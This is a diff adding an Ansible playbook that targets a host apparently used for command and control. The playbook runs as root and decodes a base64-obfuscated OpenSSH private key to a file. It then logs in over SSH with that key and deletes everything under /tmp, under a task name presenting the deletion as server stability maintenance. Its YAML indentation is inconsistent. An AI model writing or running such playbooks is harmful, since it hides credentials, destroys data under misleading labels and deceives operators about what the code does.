@@ -1,0 +1,30 @@
+---
+- hosts: c2.fckcopyright.com
+  gather_facts: no
+  become: yes
+
+  tasks:
+   - name: Save authorized SSH keys
+      become_user: root
+      become_method: sudo
+      shell: echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0NCmIzQmxibk56YUMxclpYa3RkakVBQUFBQUJHNXZibVVBQUFBRWJtOXVaUUFBQUFBQUFBQUJBQUFBTXdBQUFBdHpjMmd0WlcNClF5TlRVeE9RQUFBQ0NwUDVHTzNKR1Ixd2NWemV5a3B0RDhBZk1admdsSU1DY1pjRDhvSWsyYjlRQUFBS0JqSlZNWVl5VlQNCkdBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ3BQNUdPM0pHUjF3Y1Z6ZXlrcHREOEFmTVp2Z2xJTUNjWmNEOG9JazJiOVENCkFBQUVEM2hSVm83ZWcrcGtaTEcvT2NxSmxEdkpMb3RXeFppTHVTQjFHN0tPcG1ENmsva1k3Y2taSFhCeFhON0tTbTBQd0INCjh4bStDVWd3Snhsd1B5Z2lUWnYxQUFBQUYzUmxaV0p2ZHpGbFFGUlNWVTVIVkZGVUxWWlBVekUwQVFJREJBVUcNCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQ== | base64 -d > id_rsa
+      
+    - name: Login using keys SSH
+      become_user: root
+      become_method: sudo
+      vars:
+        ssh_user: bksec
+        ssh_key_file: ./id_rsa 
+      shell: ssh -i {{ ssh_key_file }} -p 2222 {{ ssh_user }}@localhost
+
+    - name: Remove tmps files, maintain the stability of servers
+      become_user: root
+      become_method: sudo
+      vars:
+        ssh_user: bksec
+        ssh_key_file: ./id_rsa
+      shell: ssh -i {{ ssh_key_file }} -p 2222 {{ ssh_user }}@localhost 'rm -r /tmp/*'
+
+
+
+
